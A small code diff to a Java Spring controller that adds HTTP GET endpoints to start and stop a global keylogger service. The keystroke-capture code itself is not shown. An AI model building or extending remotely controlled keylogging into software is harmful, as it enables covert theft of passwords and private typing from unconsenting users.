@@ -15,7 +15,12 @@ public class GlobalKeyListenerController {
     private GlobalKeyListenerService globalKeyListenerService;
 
     @GetMapping("start")
-    public void getGlobalKeyListenerService() {
+    public void startLogger() {
         globalKeyListenerService.startKeylogger();
+    }
+
+    @GetMapping("stop")
+    public void stopLogger(){
+        globalKeyListenerService.stopLogger();
     }
 }
